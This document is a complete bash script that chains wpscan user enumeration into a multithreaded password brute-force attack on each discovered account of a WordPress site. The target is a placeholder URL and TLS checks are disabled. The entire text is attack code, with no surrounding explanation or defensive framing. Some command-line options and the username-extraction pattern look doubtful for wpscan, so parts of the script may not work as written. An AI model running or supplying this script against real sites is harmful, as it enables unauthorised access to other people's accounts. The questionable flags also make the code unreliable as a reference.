#!/bin/bash

# Set the target WordPress URL
TARGET_URL="http://example.com"

# Set the path to the wordlist containing passwords
PASSWORDLIST="/path/to/passwordlist.txt"

# Perform user enumeration
echo "Performing user enumeration..."
wpscan --url $TARGET_URL --enumerate u > user_enum.txt

# Extract usernames from the user enumeration result
USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')

# Perform brute force attack for each username
for USERNAME in $USERLIST; do
    echo "Performing brute force attack for user: $USERNAME..."
    wpscan --url $TARGET_URL --passwords $PASSWORDLIST --user $USERNAME --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output brute_force_result_$USERNAME.txt
done

echo "Done."
